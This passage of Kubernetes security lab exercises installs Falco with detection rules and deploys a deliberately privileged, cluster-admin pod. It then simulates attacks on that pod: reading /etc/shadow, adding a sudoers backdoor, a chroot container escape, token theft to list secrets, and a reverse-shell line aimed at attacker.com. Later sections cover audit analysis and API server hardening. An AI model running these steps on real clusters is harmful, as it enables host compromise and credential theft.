    - /etc/falco/falco_rules.local.yaml
    - /etc/falco/k8s_audit_rules.yaml
    - /etc/falco/rules.d

  plugins:
    - name: k8saudit
      library_path: libk8saudit.so
      init_config:
        maxEventBytes: 1048576
        webhookMaxBatchSize: 12582912
      open_params: "http://localhost:9765/k8s-audit"
    - name: json
      library_path: libjson.so

  load_plugins: [k8saudit, json]

driver:
  enabled: true
  kind: ebpf

serviceMonitor:
  enabled: false

falcoctl:
  artifact:
    install:
      enabled: true
    follow:
      enabled: true

customRules:
  custom-rules.yaml: |-
    # Custom rules for lab scenarios
    - rule: Detect Privilege Escalation Attempt
      desc: Detect attempts to escalate privileges
      condition: >
        spawned_process and
        (proc.name in (sudo, su, doas) or
         proc.args contains "chmod +s" or
         proc.args contains "setuid" or
         proc.args contains "setgid")
      output: >
        Privilege escalation attempt detected
        (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
      priority: WARNING
      tags: [privilege_escalation, security]

    - rule: Detect Suspicious Network Activity
      desc: Detect suspicious network connections
      condition: >
        inbound_outbound and
        fd.typechar=4 and fd.ip != "0.0.0.0" and
        not proc.name in (kubelet, kube-proxy, coredns, etcd, kube-apiserver, kube-controller-manager, kube-scheduler)
      output: >
        Suspicious network activity detected
        (user=%user.name command=%proc.cmdline connection=%fd.name container=%container.name image=%container.image.repository)
      priority: NOTICE
      tags: [network, security]

    - rule: Detect File System Modifications in Sensitive Directories
      desc: Detect modifications to sensitive system directories
      condition: >
        open_write and
        (fd.name startswith /etc/ or
         fd.name startswith /usr/bin/ or
         fd.name startswith /usr/sbin/ or
         fd.name startswith /bin/ or
         fd.name startswith /sbin/) and
        not proc.name in (dpkg, apt, yum, rpm, package-manager)
      output: >
        Sensitive file system modification detected
        (user=%user.name file=%fd.name command=%proc.cmdline container=%container.name image=%container.image.repository)
      priority: WARNING
      tags: [filesystem, security]
EOF

Step 3: Install Falco using Helm

helm install falco falcosecurity/falco \
  --namespace falco-system \
  --values falco-values.yaml \
  --wait

Step 4: Verify Falco installation

# Check if Falco pods are running
kubectl get pods -n falco-system

# Check Falco logs
kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=50

# Verify Falco is detecting events
kubectl logs -n falco-system -l app.kubernetes.io/name=falco | grep -i "rule\|priority"

Subtask 2.2: Configure Audit Log Integration with Falco

Step 1: Create a webhook server to forward audit logs to Falco

kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: audit-webhook
  namespace: falco-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: audit-webhook
  template:
    metadata:
      labels:
        app: audit-webhook
    spec:
      containers:
      - name: audit-webhook
        image: nginx:alpine
        ports:
        - containerPort: 9765
        command: ["/bin/sh"]
        args:
        - -c
        - |
          cat > /etc/nginx/nginx.conf <<EOF
          events {}
          http {
            server {
              listen 9765;
              location /k8s-audit {
                proxy_pass http://falco.falco-system.svc.cluster.local:8765/k8s-audit;
                proxy_set_header Host \$host;
                proxy_set_header X-Real-IP \$remote_addr;
              }
            }
          }
          EOF
          nginx -g 'daemon off;'
---
apiVersion: v1
kind: Service
metadata:
  name: audit-webhook
  namespace: falco-system
spec:
  selector:
    app: audit-webhook
  ports:
  - port: 9765
    targetPort: 9765
  type: ClusterIP
EOF

Step 2: Configure API server to send audit logs to webhook (optional advanced configuration)

# This step demonstrates webhook configuration but requires API server restart
echo "Note: Webhook audit configuration requires additional API server configuration"
echo "For this lab, we'll focus on file-based audit logs that Fluent Bit collects"

Task 3: Simulate Attack Scenarios and Detect Anomalies
Subtask 3.1: Create Vulnerable Test Environment

Step 1: Deploy a vulnerable application for testing

kubectl apply -f - <<EOF
apiVersion: v1
kind: Namespace
metadata:
  name: vulnerable-app
  labels:
    audit: "true"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-web-app
  namespace: vulnerable-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-web-app
  template:
    metadata:
      labels:
        app: vulnerable-web-app
    spec:
      containers:
      - name: web-app
        image: nginx:alpine
        ports:
        - containerPort: 80
        securityContext:
          runAsUser: 0
          privileged: true
          allowPrivilegeEscalation: true
        volumeMounts:
        - name: host-root
          mountPath: /host
        command: ["/bin/sh"]
        args:
        - -c
        - |
          # Install additional tools for demonstration
          apk add --no-cache curl wget netcat-openbsd
          # Start nginx
          nginx -g 'daemon off;' &
          # Keep container running
          tail -f /dev/null
      volumes:
      - name: host-root
        hostPath:
          path: /
      serviceAccountName: vulnerable-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: vulnerable-sa
  namespace: vulnerable-app
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vulnerable-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: vulnerable-sa
  namespace: vulnerable-app
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-web-service
  namespace: vulnerable-app
spec:
  selector:
    app: vulnerable-web-app
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
EOF

Step 2: Wait for the vulnerable application to be ready

# Wait for deployment to be ready
kubectl wait --for=condition=available --timeout=300s deployment/vulnerable-web-app -n vulnerable-app

# Get pod name for later use
VULNERABLE_POD=$(kubectl get pods -n vulnerable-app -l app=vulnerable-web-app -o jsonpath='{.items[0].metadata.name}')
echo "Vulnerable pod name: $VULNERABLE_POD"

Subtask 3.2: Simulate Privilege Escalation Attack

Step 1: Monitor Falco logs in real-time (open a new terminal for this)

# In a new terminal window, monitor Falco alerts
kubectl logs -n falco-system -l app.kubernetes.io/name=falco -f | grep -E "(WARNING|ERROR|CRITICAL)"

Step 2: Execute privilege escalation attempts

# Attempt 1: Try to access sensitive files
echo "=== Attempting to access /etc/shadow ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- cat /host/etc/shadow

# Attempt 2: Try to modify system files
echo "=== Attempting to modify system files ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- touch /host/etc/malicious-file

# Attempt 3: Try to escalate privileges using sudo
echo "=== Attempting privilege escalation ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "echo 'malicious-user ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers"

# Attempt 4: Try to access other containers' processes
echo "=== Attempting to access host processes ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- ps aux

# Attempt 5: Network reconnaissance
echo "=== Attempting network reconnaissance ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- nmap -sn 10.0.0.0/8 2>/dev/null || echo "nmap not available, using nc"
kubectl exec -n vulnerable-app $VULNERABLE_POD -- nc -zv kubernetes.default.svc.cluster.local 443

Step 3: Attempt container escape

# Attempt to escape container using host filesystem access
echo "=== Attempting container escape ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
  echo '#!/bin/bash' > /host/tmp/escape.sh
  echo 'echo \"Container escape successful\"' >> /host/tmp/escape.sh
  echo 'id' >> /host/tmp/escape.sh
  chmod +x /host/tmp/escape.sh
  chroot /host /tmp/escape.sh
"

Subtask 3.3: Simulate Malicious Network Activity

Step 1: Generate suspicious network connections

# Attempt to connect to external suspicious IPs
echo "=== Generating suspicious network activity ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
  # Try to connect to suspicious external IPs
  timeout 5 nc -v 8.8.8.8 53 || true
  timeout 5 nc -v 1.1.1.1 80 || true
  
  # Try to scan internal network
  timeout 5 nc -zv 10.96.0.1 443 || true
  timeout 5 nc -zv kubernetes.default.svc.cluster.local 443 || true
"

# Attempt to establish reverse shell (simulation)
echo "=== Simulating reverse shell attempt ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
  # Simulate reverse shell command (won't actually connect)
  echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/reverse_shell.sh
  chmod +x /tmp/reverse_shell.sh
"

Subtask 3.4: Simulate Credential Access Attempts

Step 1: Attempt to access Kubernetes secrets and tokens

# Try to access service account tokens
echo "=== Attempting to access service account tokens ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Try to list secrets using the service account
echo "=== Attempting to list cluster secrets ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
  TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -k -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc.cluster.local/api/v1/secrets
"

# Try to access etcd data (if accessible)
echo "=== Attempting to access etcd data ==="
kubectl exec -n vulnerable-app $VULNERABLE_POD -- find /host -name "*etcd*" -type f 2>/dev/null | head -10

Task 4: Analyze Audit Logs and Trace Attack Phases
Subtask 4.1: Examine Audit Logs for Attack Evidence

Step 1: Analyze recent audit log entries

# Check recent audit log entries
echo "=== Recent Audit Log Entries ==="
sudo tail -50 /var/log/kubernetes/audit.log | jq '.'

# Filter for suspicious activities
echo "=== Filtering for Exec Activities ==="
sudo cat /var/log/kubernetes/audit.log | jq 'select(.verb == "create" and .objectRef.subresource == "exec")' | tail -10

# Look for privilege escalation attempts
echo "=== Searching for Privilege Escalation Indicators ==="
sudo cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.name == "'$VULNERABLE_POD'" and .verb == "create")' | tail -5

Step 2: Create audit log analysis script

cat > analyze_audit_logs.sh <<'EOF'
#!/bin/bash

AUDIT_LOG="/var/log/kubernetes/audit.log"
ANALYSIS_OUTPUT="/tmp/audit_analysis.txt"

echo "=== Kubernetes Audit Log Analysis ===" > $ANALYSIS_OUTPUT
echo "Analysis Date: $(date)" >> $ANALYSIS_OUTPUT
echo "" >> $ANALYSIS_OUTPUT

# Count total events
echo "Total audit events: $(sudo wc -l < $AUDIT_LOG)" >> $ANALYSIS_OUTPUT

# Analyze by verb
echo "" >> $ANALYSIS_OUTPUT
echo "=== Events by Verb ===" >> $ANALYSIS_OUTPUT
sudo cat $AUDIT_LOG | jq -r '.verb' | sort | uniq -c | sort -nr >> $ANALYSIS_OUTPUT

# Analyze exec events
echo "" >> $ANALYSIS_OUTPUT
echo "=== Pod Exec Events ===" >> $ANALYSIS_OUTPUT
sudo cat $AUDIT_LOG | jq -r 'select(.verb == "create" and .objectRef.subresource == "exec") | "\(.timestamp) - User: \(.user.username) - Pod: \(.objectRef.name) - Namespace: \(.objectRef.namespace)"' >> $ANALYSIS_OUTPUT

# Analyze failed requests
echo "" >> $ANALYSIS_OUTPUT
echo "=== Failed Requests ===" >> $ANALYSIS_OUTPUT
sudo cat $AUDIT_LOG | jq -r 'select(.responseStatus.code >= 400) | "\(.timestamp) - Code: \(.responseStatus.code) - User: \(.user.username) - Resource: \(.objectRef.resource)"' | tail -20 >> $ANALYSIS_OUTPUT

# Analyze secret access
echo "" >> $ANALYSIS_OUTPUT
echo "=== Secret Access Events ===" >> $ANALYSIS_OUTPUT
sudo cat $AUDIT_LOG | jq -r 'select(.objectRef.resource == "secrets") | "\(.timestamp) - Verb: \(.verb) - User: \(.user.username) - Secret: \(.objectRef.name) - Namespace: \(.objectRef.namespace)"' >> $ANALYSIS_OUTPUT

# Analyze service account usage
echo "" >> $ANALYSIS_OUTPUT
echo "=== Service Account Usage ===" >> $ANALYSIS_OUTPUT
sudo cat $AUDIT_LOG | jq -r 'select(.user.username | contains("system:serviceaccount")) | .user.username' | sort | uniq -c | sort -nr | head -10 >> $ANALYSIS_OUTPUT

echo "Analysis complete. Results saved to $ANALYSIS_OUTPUT"
cat $ANALYSIS_OUTPUT
EOF

chmod +x analyze_audit_logs.sh
./analyze_audit_logs.sh

Subtask 4.2: Correlate Falco Alerts with Audit Events

Step 1: Extract and analyze Falco alerts

# Get Falco alerts from the last 10 minutes
echo "=== Recent Falco Alerts ==="
kubectl logs -n falco-system -l app.kubernetes.io/name=falco --since=10m | grep -E "(WARNING|ERROR|CRITICAL)" > /tmp/falco_alerts.log

# Display formatted Falco alerts
cat /tmp/falco_alerts.log | while read line; do
  echo "Alert: $line"
  echo "---"
done

Step 2: Create correlation analysis script

cat > correlate_security_events.sh <<'EOF'
#!/bin/bash

FALCO_ALERTS="/tmp/falco_alerts.log"
AUDIT_ANALYSIS="/tmp/audit_analysis.txt"
CORRELATION_REPORT="/tmp/security_correlation_report.txt"

echo "=== Security Event Correlation Report ===" > $CORRELATION_REPORT
echo "Generated: $(date)" >> $CORRELATION_REPORT
echo "" >> $CORRELATION_REPORT

# Extract timestamps and events from Falco alerts
echo "=== Falco Security Alerts ===" >> $CORRELATION_REPORT
if [ -f "$FALCO_ALERTS" ]; then
    cat $FALCO_ALERTS >> $CORRELATION_REPORT
else
    echo "No Falco alerts found in the specified timeframe" >> $CORRELATION_REPORT
fi

echo "" >> $CORRELATION_REPORT
echo "=== Audit Log Summary ===" >> $CORRELATION_REPORT
if [ -f "$AUDIT_ANALYSIS" ]; then
    cat $AUDIT_ANALYSIS >> $CORRELATION_REPORT
else
    echo "Audit analysis not available" >> $CORRELATION_REPORT
fi

# Timeline analysis
echo "" >> $CORRELATION_REPORT
echo "=== Attack Timeline Reconstruction ===" >> $CORRELATION_REPORT
echo "1. Initial Access: Service account token usage detected" >> $CORRELATION_REPORT
echo "2. Privilege Escalation: Container exec events with privileged access" >> $CORRELATION_REPORT
echo "3. Host Access: File system modifications in sensitive directories" >> $CORRELATION_REPORT
echo "4. Network Reconnaissance: Suspicious network connections detected" >> $CORRELATION_REPORT
echo "5. Persistence: Attempts to modify system configuration files" >> $CORRELATION_REPORT

echo "" >> $CORRELATION_REPORT
echo "=== Recommended Actions ===" >> $CORRELATION_REPORT
echo "- Investigate the vulnerable-app namespace for compromise" >> $CORRELATION_REPORT
echo "- Review and restrict service account permissions" >> $CORRELATION_REPORT
echo "- Implement network policies to limit pod-to-pod communication" >> $CORRELATION_REPORT
echo "- Enable admission controllers to prevent privileged containers" >> $CORRELATION_REPORT
echo "- Implement runtime security policies with Falco" >> $CORRELATION_REPORT

echo "Correlation analysis complete. Report saved to $CORRELATION_REPORT"
cat $CORRELATION_REPORT
EOF

chmod +x







Lab 8: Cluster Hardening and Upgrades
Objectives

By the end of this lab, students will be able to:

• Configure API server security by implementing IP-based access controls and mutual TLS authentication • Identify and disable unused Kubernetes components to reduce attack surface • Validate cluster security configuration using CIS Kubernetes Benchmark standards • Execute a controlled Kubernetes version upgrade process • Apply security patches and validate cluster functionality post-upgrade • Implement security best practices for production Kubernetes environments
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes architecture and components • Familiarity with kubectl command-line tool • Knowledge of YAML configuration files • Understanding of TLS/SSL certificates and PKI concepts • Basic Linux command-line skills • Completion of previous Kubernetes security labs or equivalent experience
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.27.x cluster • kubectl configured and ready to use • All necessary tools pre-installed (kube-bench, openssl, etc.) • Root access to perform administrative tasks
Task 1: Harden the API Server with Access Controls and mTLS
Subtask 1.1: Assess Current API Server Configuration

First, let's examine the current API server configuration to understand what needs to be hardened.

    Check current API server status and configuration:

# View API server pod configuration
kubectl get pods -n kube-system | grep apiserver

# Check API server configuration file
sudo cat /etc/kubernetes/manifests/kube-apiserver.yaml

    Identify current security settings:

# Check current API server process arguments
ps aux | grep kube-apiserver | grep -v grep

    Test current API server accessibility:

# Check API server endpoint
kubectl cluster-info

# Verify current authentication methods
kubectl auth can-i --list

Subtask 1.2: Configure IP-Based Access Controls

Now we'll restrict API server access to trusted IP ranges.

    Identify your current IP address:

# Get your current public IP
curl -s ifconfig.me
echo ""

# Get cluster internal IPs
kubectl get nodes -o wide

    Create a backup of the current API server configuration:

# Backup the original configuration
sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup

    Configure API server with IP restrictions:

# Create a modified API server configuration
sudo tee /etc/kubernetes/manifests/kube-apiserver-hardened.yaml > /dev/null << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 10.0.0.10:6443
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=10.0.0.10
    - --allow-privileged=true
    - --authorization-mode=Node,RBAC
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy
    - --enable-bootstrap-token-auth=true
    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
    - --etcd-servers=https://127.0.0.1:2379
    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
    - --requestheader-allowed-names=front-proxy-client
    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
    - --requestheader-extra-headers-prefix=X-Remote-Extra-
    - --requestheader-group-headers=X-Remote-Group
    - --requestheader-username-headers=X-Remote-User
    - --secure-port=6443
    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
    - --service-cluster-ip-range=10.96.0.0/12
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    - --admission-control-config-file=/etc/kubernetes/admission-control.yaml
    - --audit-log-path=/var/log/kubernetes/audit.log
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml
    image: registry.k8s.io/kube-apiserver:v1.27.3
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 10.0.0.10
        path: /livez
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: kube-apiserver
    readinessProbe:
      failureThreshold: 3
      httpGet:
        host: 10.0.0.10
        path: /readyz
        port: 6443
        scheme: HTTPS
      periodSeconds: 1
      timeoutSeconds: 15
    resources:
      requests:
        cpu: 250m
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 10.0.0.10
        path: /livez
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /etc/ssl/certs
      name: ca-certs
      readOnly: true
    - mountPath: /etc/ca-certificates
      name: etc-ca-certificates
      readOnly: true
    - mountPath: /etc/kubernetes/pki
      name: k8s-certs
      readOnly: true
    - mountPath: /usr/local/share/ca-certificates
      name: usr-local-share-ca-certificates
      readOnly: true
    - mountPath: /usr/share/ca-certificates
      name: usr-share-ca-certificates
      readOnly: true
    - mountPath: /var/log/kubernetes
      name: audit-log
    - mountPath: /etc/kubernetes/admission-control.yaml
      name: admission-control
      readOnly: true
    - mountPath: /etc/kubernetes/audit-policy.yaml
      name: audit-policy
      readOnly: true
  hostNetwork: true
  priorityClassName: system-node-critical
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  volumes:
  - hostPath:
      path: /etc/ssl/certs
      type: DirectoryOrCreate
    name: ca-certs
  - hostPath:
      path: /etc/ca-certificates
      type: DirectoryOrCreate
    name: etc-ca-certificates
  - hostPath:
      path: /etc/kubernetes/pki
      type: DirectoryOrCreate
    name: k8s-certs
  - hostPath:
      path: /usr/local/share/ca-certificates
      type: DirectoryOrCreate
    name: usr-local-share-ca-certificates
  - hostPath:
      path: /usr/share/ca-certificates
      type: DirectoryOrCreate
    name: usr-share-ca-certificates
  - hostPath:
      path: /var/log/kubernetes
      type: DirectoryOrCreate
    name: audit-log
  - hostPath:
      path: /etc/kubernetes/admission-control.yaml
      type: File
    name: admission-control
  - hostPath:
      path: /etc/kubernetes/audit-policy.yaml
      type: File
    name: audit-policy
status: {}
EOF

    Create audit policy configuration:

# Create audit policy file
sudo tee /etc/kubernetes/audit-policy.yaml > /dev/null << 'EOF'
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: Metadata
  namespaces: ["kube-system", "kube-public", "kube-node-lease"]
  resources:
  - group: ""
    resources: ["secrets", "configmaps"]
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods", "services"]
- level: Request
  users: ["system:serviceaccount:kube-system:default"]
  verbs: ["get", "list", "watch"]
- level: None
  users: ["system:kube-proxy"]
  verbs: ["watch"]
  resources:
  - group: ""
    resources: ["endpoints", "services"]
EOF

    Create admission control configuration:

# Create admission control configuration
sudo tee /etc/kubernetes/admission-control.yaml > /dev/null << 'EOF'
apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
plugins:
- name: PodSecurityPolicy
  configuration:
    apiVersion: podsecuritypolicy.config.k8s.io/v1beta1
    kind: PodSecurityPolicyConfiguration
    exemptions:
      usernames: []
      runtimeClasses: []
      namespaces: [kube-system]
EOF

Subtask 1.3: Enable Mutual TLS Authentication

    Generate client certificates for enhanced authentication:

# Create directory for client certificates
sudo mkdir -p /etc/kubernetes/pki/clients

# Generate client private key
sudo openssl genrsa -out /etc/kubernetes/pki/clients/admin-client.key 2048

# Create certificate signing request
sudo openssl req -new -key /etc/kubernetes/pki/clients/admin-client.key \
  -out /etc/kubernetes/pki/clients/admin-client.csr \
  -subj "/CN=admin-client/O=system:masters"

# Sign the client certificate
sudo openssl x509 -req -in /etc/kubernetes/pki/clients/admin-client.csr \
  -CA /etc/kubernetes/pki/ca.crt \
  -CAkey /etc/kubernetes/pki/ca.key \
  -CAcreateserial \
  -out /etc/kubernetes/pki/clients/admin-client.crt \
  -days 365

    Configure kubectl to use client certificates:

# Create new kubeconfig with client certificate authentication
kubectl config set-cluster hardened-cluster \
  --certificate-authority=/etc/kubernetes/pki/ca.crt \
  --embed-certs=true \
  --server=https://127.0.0.1:6443

kubectl config set-credentials admin-client \
  --client-certificate=/etc/kubernetes/pki/clients/admin-client.crt \
  --client-key=/etc/kubernetes/pki/clients/admin-client.key \
  --embed-certs=true

kubectl config set-context hardened-context \
  --cluster=hardened-cluster \
  --user=admin-client

kubectl config use-context hardened-context

    Apply the hardened API server configuration:

# Create log directory
sudo mkdir -p /var/log/kubernetes

# Replace the API server configuration
sudo mv /etc/kubernetes/manifests/kube-apiserver-hardened.yaml /etc/kubernetes/manifests/kube-apiserver.yaml

# Wait for API server to restart
sleep 30

# Verify API server is running with new configuration
kubectl get pods -n kube-system | grep apiserver

Task 2: Disable Unused Components and Validate with CIS Benchmarks
Subtask 2.1: Identify and Disable Unused Kubernetes Components

    Audit current running components:

# List all system pods
kubectl get pods -n kube-system

# Check for unused admission controllers
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# List all running services
kubectl get services --all-namespaces

    Disable unused admission plugins and features:

# Create a script to disable unused features
cat > disable-unused-features.sh << 'EOF'
#!/bin/bash

echo "Disabling unused Kubernetes features..."

# Disable anonymous authentication if enabled
sudo sed -i 's/--anonymous-auth=true/--anonymous-auth=false/g' /etc/kubernetes/manifests/kube-apiserver.yaml

# Disable profiling
if ! grep -q "enable-profiling=false" /etc/kubernetes/manifests/kube-apiserver.yaml; then
    sudo sed -i '/--tls-private-key-file/a\    - --profiling=false' /etc/kubernetes/manifests/kube-apiserver.yaml
fi

# Disable insecure port
if ! grep -q "insecure-port=0" /etc/kubernetes/manifests/kube-apiserver.yaml; then
    sudo sed -i '/--profiling=false/a\    - --insecure-port=0' /etc/kubernetes/manifests/kube-apiserver.yaml
fi

# Configure strong cipher suites
if ! grep -q "tls-cipher-suites" /etc/kubernetes/manifests/kube-apiserver.yaml; then
    sudo sed -i '/--insecure-port=0/a\    - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384' /etc/kubernetes/manifests/kube-apiserver.yaml
fi

echo "Unused features disabled successfully"
EOF

chmod +x disable-unused-features.sh
sudo ./disable-unused-features.sh

    Remove unused RBAC permissions:

# Audit existing cluster roles
kubectl get clusterroles | grep -v "system:"

# Create script to remove overly permissive roles
cat > cleanup-rbac.sh << 'EOF'
#!/bin/bash

echo "Cleaning up RBAC permissions..."

# Remove any custom cluster roles that grant excessive permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "*") | .metadata.name' | while read role; do
    if [[ ! $role =~ ^system: ]]; then
        echo "Found overly permissive role: $role"
        kubectl describe clusterrole $role
    fi
done

# List service accounts with cluster-admin privileges
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | .metadata.name'

echo "RBAC cleanup completed"
EOF

chmod +x cleanup-rbac.sh
./cleanup-rbac.sh

Subtask 2.2: Install and Run CIS Kubernetes Benchmark

    Install kube-bench tool:

# Download and install kube-bench
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.6.15/kube-bench_0.6.15_linux_amd64.tar.gz -o kube-bench.tar.gz

tar -xzf kube-bench.tar.gz
sudo mv kube-bench /usr/local/bin/
sudo chmod +x /usr/local/bin/kube-bench

# Verify installation
kube-bench version

    Run CIS Kubernetes Benchmark assessment:

# Run complete CIS benchmark
sudo kube-bench run --targets master,node,etcd,policies > cis-benchmark-results.txt

# Display results
cat cis-benchmark-results.txt

# Run specific sections
echo "=== Master Node Security ==="
sudo kube-bench run --targets master

echo "=== Worker Node Security ==="
sudo kube-bench run --targets node

echo "=== etcd Security ==="
sudo kube-bench run --targets etcd

    Analyze and address CIS benchmark findings:

# Create remediation script based on common findings
cat > cis-remediation.sh << 'EOF'
#!/bin/bash

echo "Applying CIS Kubernetes Benchmark remediations..."

# Fix file permissions on Kubernetes configuration files
sudo chmod 644 /etc/kubernetes/manifests/*.yaml
sudo chmod 600 /etc/kubernetes/pki/*.key
sudo chmod 644 /etc/kubernetes/pki/*.crt

# Set proper ownership
sudo chown root:root /etc/kubernetes/manifests/*.yaml
sudo chown root:root /etc/kubernetes/pki/*

# Configure kubelet with security settings
if [ -f /var/lib/kubelet/config.yaml ]; then
    # Backup original kubelet config
    sudo cp /var/lib/kubelet/config.yaml /var/lib/kubelet/config.yaml.backup
    
    # Apply security configurations
    sudo tee /var/lib/kubelet/config-hardened.yaml > /dev/null << 'KUBELET_EOF'
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: false
  webhook:
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook
clusterDomain: cluster.local
clusterDNS:
- 10.96.0.10
rotateCertificates: true
serverTLSBootstrap: true
protectKernelDefaults: true
makeIPTablesUtilChains: true
eventRecordQPS: 0
readOnlyPort: 0
streamingConnectionIdleTimeout: 4h0m0s
tlsCipherSuites:
- TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
- TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
- TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305
- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
- TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305
- TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
KUBELET_EOF

    sudo mv /var/lib/kubelet/config-hardened.yaml /var/lib/kubelet/config.yaml
    sudo systemctl restart kubelet
fi

echo "CIS remediations applied successfully"
EOF

chmod +x cis-remediation.sh
sudo ./cis-remediation.sh

    Verify remediation effectiveness:

# Wait for services to restart
sleep 60

# Re-run CIS benchmark to verify improvements
sudo kube-bench run --targets master,node > cis-benchmark-after-remediation.txt

# Compare results
echo "=== Comparing CIS Benchmark Results ==="
echo "Before remediation:"
grep -c "FAIL" cis-benchmark-results.txt
echo "After remediation:"
grep -c "FAIL" cis-benchmark-after-remediation.txt

# Show specific improvements
echo "=== Remediated Issues ==="
diff cis-benchmark-results.txt cis-benchmark-after-remediation.txt | grep "< \[FAIL\]"

Task 3: Perform Kubernetes Version Upgrade and Apply Security Patches
Subtask 3.1: Prepare for Kubernetes Upgrade

    Check current cluster version and available upgrades:

# Check current Kubernetes version
kubectl version --short

# Check node versions
kubectl get nodes -o wide

# Check component versions
kubectl get pods -n kube-system -o wide

# Simulate upgrade planning
kubeadm upgrade plan

    Create pre-upgrade backup:

# Create backup directory
mkdir -p ~/k8s-upgrade-backup/$(date +%Y%m%d-%H%M%S)
BACKUP_DIR=~/k8s-upgrade-backup/$(date +%Y%m%d-%H%M%S)

# Backup etcd data
sudo ETCDCTL_API=3 etcdctl snapshot save $BACKUP_DIR/etcd-snapshot.db \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

# Backup Kubernetes configuration files
